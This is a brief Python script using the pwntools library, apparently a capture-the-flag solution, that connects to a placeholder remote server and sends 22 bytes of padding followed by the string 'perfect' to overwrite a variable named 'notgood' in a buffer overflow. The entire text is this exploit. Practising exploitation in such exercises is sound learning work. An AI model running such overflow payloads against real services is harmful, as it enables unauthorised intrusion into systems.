from pwn import *

# connect to remote server
p = remote("SERVER", port)

# send 22 bytes first
payload = b'A' * 22

#overwrite `notgood`
payload += b'perfect'

# send payload to server
p.sendline(payload)
p.interactive()